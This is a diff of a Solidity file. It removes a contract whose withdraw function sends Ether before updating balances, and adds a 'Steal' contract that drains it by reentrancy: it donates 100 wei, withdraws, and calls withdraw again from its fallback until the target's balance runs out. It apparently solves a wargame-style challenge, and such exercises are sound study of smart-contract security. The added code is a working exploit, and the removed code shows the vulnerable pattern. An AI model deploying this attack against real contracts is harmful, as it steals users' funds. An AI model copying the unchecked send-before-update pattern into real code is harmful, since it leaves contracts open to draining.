@@ -1,27 +1,29 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Reentrance {
-    mapping(address => uint256) public balances;
+import "./reentrancy.sol";
 
-    constructor() payable {}
+contract Steal {
+    Reentrance public reentrance;
 
-    function donate(address _to) public payable {
-        balances[_to] += msg.value;
+    constructor(address _reentranceAddr) payable {
+        reentrance = Reentrance(_reentranceAddr);
     }
 
-    function balanceOf(address _who) public view returns (uint256 balance) {
-        return balances[_who];
+    function steal() public payable {
+        require(msg.value >= 100 wei);
+
+        reentrance.donate{value: 100 wei}(address(this));
+        reentrance.withdraw(100);
     }
 
-    function withdraw(uint256 _amount) public {
-        if (balances[msg.sender] >= _amount) {
-            (bool result, ) = msg.sender.call{value: _amount}("");
-            require(result, "Failed to send eth");
-
-            unchecked {
-                balances[msg.sender] -= _amount;
-            }
+    fallback() external payable {
+        if (address(reentrance).balance >= 100 wei) {
+            reentrance.withdraw(100);
         }
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
     }
 }
